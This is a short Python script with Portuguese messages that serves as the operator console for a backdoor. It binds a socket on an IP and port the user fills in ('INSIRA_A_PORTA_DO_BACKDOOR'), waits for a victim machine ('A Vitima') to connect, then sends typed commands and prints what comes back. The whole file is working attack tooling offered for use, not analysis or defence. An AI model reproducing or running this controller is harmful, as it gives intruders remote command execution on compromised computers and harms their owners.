import socket
import subprocess

target_host = 'INSIRA_SEU_IP'
target_port = INSIRA_A_PORTA_DO_BACKDOOR

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((target_host, target_port))
print("Aguardando conexões...")
sock.listen(1)
target, ip = sock.accept()
print(f"CONECTADO AO HOST {target_host}:{target_port}")

try:
    while True:
        command = input("==> ")
        target.send(command.encode())
        if command.lower() == 'exit':
            break
        output = target.recv(4096)
        try:
            decoded_output = output.decode('utf-8')
        except UnicodeDecodeError:
            decoded_output = output.decode('latin-1')
        print(decoded_output)

except ConnectionAbortedError:
    print("A Vitima encerrou o host remoto.")
finally:
    sock.close()
